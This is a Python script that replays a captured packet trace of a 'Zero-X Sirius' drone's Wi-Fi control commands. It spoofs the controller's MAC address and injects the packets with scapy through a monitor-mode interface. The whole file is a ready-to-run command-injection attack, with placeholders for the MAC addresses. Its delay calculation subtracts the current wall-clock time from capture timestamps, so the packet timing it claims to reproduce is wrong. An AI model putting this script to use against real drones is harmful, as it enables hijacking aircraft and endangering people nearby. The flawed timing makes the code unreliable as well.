import time
# We use scapy.all for monitor mode injection (sendp)
try:
    from scapy.all import rdpcap, sendp, Dot11
except ImportError:
    print("[!] Scapy not found. Install it using 'sudo pip install scapy'.")
    exit()

# --- CONFIGURATION ---
# 1. Update this path to the NEWLY CONVERTED PCAP file
PCAP_FILE_PATH = 'sirius_off-on-stop-off_capture.pcap' 

# 2. Update this to your Wi-Fi interface name (the one in MONITOR MODE)
# IMPORTANT: This MUST be the monitor interface (e.g., wlan0mon)
WIFI_IFACE = 'wlan0mon' 

# 3. Update this to the actual MAC address of the ORIGINAL controller (your phone)
# We will overwrite the source MAC in the PCAP with this spoofed MAC.
SPOOFED_MAC = 'CA:A9:96:5B:50:05'  # <-- REPLACE THIS PLACEHOLDER!

# 4. Target MAC Address (The drone's MAC, likely 192.168.169.1's MAC)
DRONE_MAC = 'C4:D7:FD:03:F3:FD' # <-- REPLACE THIS PLACEHOLDER!

# --- MAIN REPLAY LOGIC ---
def replay_pcap_mac_spoof(filepath, iface, source_mac, target_mac):
    print("--- Zero-X Sirius MAC Spoofing Injection ---")
    
    try:
        # Load the newly converted Ethernet packets
        packets = rdpcap(filepath)
    except FileNotFoundError:
        print(f"[!] Error: PCAP file not found at '{filepath}'.")
        return
    except Exception as e:
        print(f"[!] Error reading PCAP file. Did you run 'editcap' in Step 1? Error: {e}")
        return

    print(f"[*] Total packets found: {len(packets)}")
    
    # Get the timestamp of the first packet to calculate precise delays
    start_time = packets[0].time
    injected_count = 0

    for i, pkt in enumerate(packets):
        # Calculate the time to wait based on the original capture timing
        delay = pkt.time - (start_time + (time.time() - start_time))
        if delay > 0:
            time.sleep(delay)

        # The core of the MAC Spoofing: Overwrite the source/destination MACs
        try:
            # We assume the packets now have an Ethernet layer (L2) after editcap
            pkt.src = source_mac
            pkt.dst = target_mac
            
            # Send the packet using sendp (for layer 2 / monitor mode)
            sendp(pkt, iface=iface, verbose=0)
            injected_count += 1
            print(f"[*] Injected packet {i+1}/{len(packets)} (Source MAC Spoofed: {source_mac}, Delay: {delay:.4f}s)")
            
        except Exception as e:
            print(f"[!] Critical Error during injection of packet {i+1}: {e}")
            print(f"[!] Check if interface '{iface}' is running in monitor mode.")
            break

    print(f"\n--- Replay Complete ---")
    print(f"[*] Successfully injected: {injected_count} command packets.")


if __name__ == '__main__':
    replay_pcap_mac_spoof(PCAP_FILE_PATH, WIFI_IFACE, SPOOFED_MAC, DRONE_MAC)
